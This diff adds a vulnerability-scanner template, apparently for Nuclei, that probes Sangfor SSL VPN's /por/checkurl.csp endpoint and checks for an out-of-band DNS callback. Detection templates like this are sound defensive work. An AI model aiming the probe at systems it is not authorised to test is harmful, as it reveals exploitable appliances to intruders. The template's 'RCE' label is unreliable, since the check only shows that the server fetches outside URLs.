@@ -1,0 +1,40 @@
+id: sangfor-sslvpn-rce
+info:
+  name: Sangfor SSL VPN RCE Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a remote code execution vulnerability in Sangfor SSL VPN by sending specific payloads and validating the responses and reverse interaction.
+http:
+  - id: r0
+    method: GET
+    path:
+      - "{{BaseURL}}/por/checkurl.csp"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "2"
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/por/checkurl.csp?url=http://{{interactsh-url}}&retry=0&timeout=1"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
